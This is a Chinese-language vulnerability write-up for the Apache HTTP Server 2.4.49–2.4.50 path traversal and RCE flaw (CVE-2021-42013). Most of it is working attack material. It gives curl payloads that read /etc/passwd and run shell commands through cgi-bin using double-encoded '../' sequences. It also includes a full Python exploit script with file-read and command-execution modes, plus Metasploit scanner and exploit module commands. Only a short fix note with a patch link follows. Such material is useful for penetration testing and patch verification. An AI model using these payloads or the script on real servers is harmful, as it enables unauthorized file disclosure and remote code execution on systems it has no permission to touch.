## 漏洞简介
**Apache HTTP Server 存在路径遍历漏洞，该漏洞源于发现 Apache HTTP Server 2.4.50 版本中对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。**
**​**

**​**

## 影响版本
**Apache HTTP Server 2.4.49 ~  2.4.50 **
​

## 利用过程
### Curl
#### Curl发送Payload读取文件
```php
curl http://172.25.0.2/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1637070554251-7ad68d91-24ef-49b1-b0b9-aa4d2bb1856e.png#clientId=u68ecc23c-581c-4&from=paste&height=363&id=ua8f44033&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1816&originalType=binary&ratio=1&size=196671&status=done&style=none&taskId=ue4d040e2-1d06-46b6-945c-6c34d7ce9a9&width=908)
#### Curl执行命令
```php
curl -v --data "echo;id" 'http://192.168.190.134:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1637070698236-5dee67fe-98e0-487b-b4f5-24b7caaa050a.png#clientId=u68ecc23c-581c-4&from=paste&height=339&id=ud56e3f6f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=677&originWidth=1920&originalType=binary&ratio=1&size=227299&status=done&style=none&taskId=ued20d559-657c-4ab4-8ba6-f00c9448a51&width=960)
### Python脚本读取文件和执行命令
```python
#!/usr/bin/env python
import urllib.error
from urllib import request,parse,error
import sys
import argparse

if len(sys.argv) <= 1:
    usage ="""Usage1: CVE-2021-42013-exp.py -H [target] -f [file]
Usage2: CVE-2021-42013-exp.py -H [target] -c [cmd]
Example：CVE-2021-42013-exp.py -H 192.168.0.1 -f /etc/passwd"""
    print(usage.format(sys.argv[0], sys.argv[0],sys.argv[0]))
    exit()

parser = argparse.ArgumentParser()
parser.add_argument("-H",dest='Host',help='Target Host',action='store')
parser.add_argument("-f",dest='File',help='Target Host File',action='store')
parser.add_argument("-c",dest='cmd',help='Command',action='store')
args = parser.parse_args()
host = args.Host if args.Host else None
file = args.File if args.File else None
cmd = args.cmd if args.cmd else None

def readfile(url,file):
    payload = f"/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{file}"
    try:
        res = request.Request(url+payload)
        response = request.urlopen(res)
        print(response.read().decode("utf-8"))
    except error.HTTPError as e:
        if e.code == 404:
            print("[-]请求的文件或页面未找到")
        elif e.code == 400:
            print("[-]目标网站不存在漏洞")
    except error.URLError:
        print("[-]目标站点未开启")

def cmdexec(url,cmd):
    payload = f"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"
    data = 'echo;{}'.format(cmd)
    data = data.encode('ascii')
    try:
        res = request.Request(url=url+payload,data=data)
        result = request.urlopen(res).read().decode('utf-8')
        if len(result)!=0:
            print(result)
        else:
            print("[-]命令或文件不存在,请重新输入")
    except error.HTTPError as e:
        if e.code == 400:
            print("[-]目标网站不存在漏洞")
    except error.URLError:
        print("[-]目标站点未开启")

if __name__ == '__main__':
    if "://" not in host:
        host = "http://" + host
    if file:
        readfile(host,file)
        sys.exit()
    if cmd:
        cmdexec(host,cmd)
        sys.exit()

```
**​**

### MSF
#### 漏洞验证
```php
msfconsole
use auxiliary/scanner/http/apache_normalize_path
set RHOSTS 172.25.0.2
set RPORT 80
set SSL false
run
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1637070321393-9378e8f7-8e7f-46eb-9934-4193f276231d.png#clientId=u68ecc23c-581c-4&from=paste&height=264&id=uc38ac95c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=1775&originalType=binary&ratio=1&size=137041&status=done&style=none&taskId=u880079d9-6096-400f-9acd-79c999b3fff&width=887.5)
#### 漏洞利用
```php
msfconsole
use exploit/multi/http/apache_normalize_path_rce
set rhosts 172.25.0.2
set rport 80
set SSL false
set target 1
set cmd id
run
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1637070417442-ab72da61-5fda-4fd1-8606-c5a5adf783c0.png#clientId=u68ecc23c-581c-4&from=paste&height=362&id=ub3131e52&margin=%5Bobject%20Object%5D&name=image.png&originHeight=723&originWidth=1900&originalType=binary&ratio=1&size=245841&status=done&style=none&taskId=u6bedb77d-e07d-4791-8acd-9e1f1ddcce3&width=950)
## 漏洞修复
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
[https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-httpd-pathtrv-LAzg68cZ](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-httpd-pathtrv-LAzg68cZ)

